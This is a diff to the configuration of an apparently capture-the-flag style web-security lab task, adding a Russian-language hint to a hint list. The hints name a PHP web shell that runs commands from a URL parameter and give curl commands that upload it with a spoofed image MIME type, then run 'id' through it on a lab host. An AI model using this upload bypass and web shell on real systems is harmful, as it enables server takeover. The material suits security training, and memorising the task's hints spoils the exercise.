@@ -20,6 +20,7 @@ lab:
   files: [task.md, shell.php]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-command-injection`): `cat shell.php` — веб-шелл исполняет `$_GET['c']`; та же инъекция команд через загруженный файл."
     - Загрузи шелл, подделав MIME: `curl -s -F 'file=@shell.php;type=image/png' -F 'name=avatar' http://app.lab.local/upload`.
     - Сервер вернёт URL загруженного файла — `/uploads/ab12cd.php`.
     - Обратись к шеллу с командой: `curl -s 'http://app.lab.local/uploads/ab12cd.php?c=id'`.
